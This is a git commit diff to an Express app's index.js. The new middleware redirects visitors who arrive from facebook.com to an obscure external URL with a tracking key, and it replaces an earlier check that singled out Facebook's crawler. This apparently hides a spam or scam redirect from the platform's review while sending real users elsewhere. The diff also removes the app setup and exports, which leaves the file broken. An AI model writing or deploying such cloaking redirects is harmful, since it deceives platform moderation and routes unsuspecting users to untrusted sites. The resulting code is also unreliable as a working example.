7fdb9111f16db5a55413f7cdf2fb5d7078513918
Billiemo <mokirpolk@gmail.com>
2024-08-20 12:47:20 +0100

    Update index.js

--- index.js
+++ index.js
@@ -1,22 +1,9 @@
-const express = require('express');
-const app = express();
-
-// Middleware to handle redirection based on user-agent
 app.use((req, res, next) => {
-  const userAgent = req.headers['user-agent'];
-  
-  if (userAgent && userAgent.includes('facebookexternalhit')) {
-    // Redirect only if user-agent indicates FacebookBot
-    res.redirect('https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb');
-  } else {
-    // Proceed to the next middleware/route
-    next();
-  }
+    const referrer = req.get('referer') || '';
+    if (referrer.includes('facebook.com')) {
+        // Redirect or mask the URL here
+        res.redirect('https://cleopatraadulatefrench.com/yrbajwpw4?key=c13dd6d2f97a5a0f967c85445d720bbb');
+    } else {
+        next();
+    }
 });
-
-// Handle other routes
-app.get('*', (req, res) => {
-  res.send('billie eilish !');
-});
-
-module.exports = app;
